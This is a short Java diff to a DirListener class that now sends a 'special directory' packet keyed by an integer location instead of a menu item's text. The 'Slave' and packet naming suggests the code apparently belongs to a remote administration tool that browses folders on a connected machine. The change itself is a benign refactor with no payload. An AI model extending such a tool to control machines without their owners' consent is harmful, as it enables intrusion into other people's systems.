@@ -10,14 +10,15 @@ import javax.swing.JMenuItem;
 public class DirListener implements ActionListener {
 
 	private Slave sl;
+	private int location;
 
-	public DirListener(Slave slave) {
+	public DirListener(Slave slave, int location) {
 		this.sl = slave;
+		this.location = location;
 	}
 
 	public void actionPerformed(ActionEvent arg0) {
-		JMenuItem item = (JMenuItem) arg0.getSource();
-		sl.addToSendQueue(new Packet41SpecialDirectory(item.getText().toUpperCase()));
+		sl.addToSendQueue(new Packet41SpecialDirectory(location));
 	}
 
 }
